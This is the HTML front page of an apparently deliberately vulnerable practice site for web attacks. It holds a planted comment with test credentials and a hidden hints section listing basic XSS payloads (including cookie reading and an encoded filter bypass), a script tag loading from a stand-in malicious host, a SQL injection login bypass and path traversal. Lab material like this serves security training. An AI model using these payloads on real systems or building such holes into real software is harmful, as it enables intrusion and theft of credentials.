<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<link type='text/css' rel='stylesheet' href='stylesheet/styles.css' />
<script language="javascript">
function showHint()
{
document.getElementById('hint').style.visibility = "visible";	
}
</script>
</head>
<body style='background-color:#3a3d32'>
<!--Attn Developers: Username: test Password: 1234  please remove when development is complete-->
<center><img src="images/logo.jpg" width='80%' height='175px' style='padding-top:0px;' /><br /><a href='index.php'>XSS & CSRF</a><a href='iframe.php?page=form.php'>IFrame Injection</a><a href='iframe.php?page=form.php'>RFI & LFI</a><a href='flash.php'>Flash</a><a href='code.php'>Code Injection & Cookies</a><a href='walk.php'>Tutorials & Walkthroughs</a><br /><br /><p>This site is vulnerable to many different web attacks, the examples are very basic to get more information i will leave a set of references.</p><br /><form method="post" action="submit.php">
<p>User Name:<br /><input type="text" name="user" /></p>
<p>Password:<br /><input type="password" name="pass" /></p>
<input type="submit" class='sub' value="Log In" />
</form></center><br /><a onclick="showHint();">Show Hints</a>
<center><p>Developed By: <a href="http://www.webdevelopmentsolutions.org">Gh0$7</a></p></center>
<p id="hint" style="visibility: hidden">

Let's start by using Xss!<br /><br />
There are many different Xss and CSRF attacks that can be used, lets start with the easy ones.<br /><br />
1) &lt;script&gt;alert('xss');&lt;script&gt;<br />
2) &lt;script&gt;alert(document.cookie);&lt;/script&gt;<br />
3) &lt;IMG SRC=javascript:alert('xss') /;&gt;<br />
4) Encoded for filter bypass - %3Cscript%3Ealert%28%27xss%27%29%3B%3C%2fscript%3E<br /><br />
Now CSRF!<br /><br />
1) &lt;script src="http://yourMaliciousCodeSite.com"&gt;&lt;/script&gt;<br />
2) &lt;img src="http://some site you want to grab from"&gt;<br />
2) &lt;img src="http://a vulnerable site you want another user to inject to"&gt;<br /><br />
There are three ways to access this site:<br /><br />
1) Sql Injection - ' or 1=1--<br />
Through the right query string with sql injection you should be able to dump the user:pass combo from the server, or log in as admin<br /><br />
2) Forced Browsing - ../../<br />
The use of forced browsing is very common in servers that have not been secured properly. Sometimes you can find a text file containing information, or even access htdocs on a linux box. This site was set up for demonstration purposes. The file is located in the folder named "pass"<br /><br />
3) Examine the code to see if you see any hints<br />
Many times developers will leave pertinant information inside of the code because they are rushed and forget to remove comments. Other possibilities are they hard coded certain information that can be use full for an attack. Always examine the code to look for clues.<br /><br />

</p>

</body>
</html>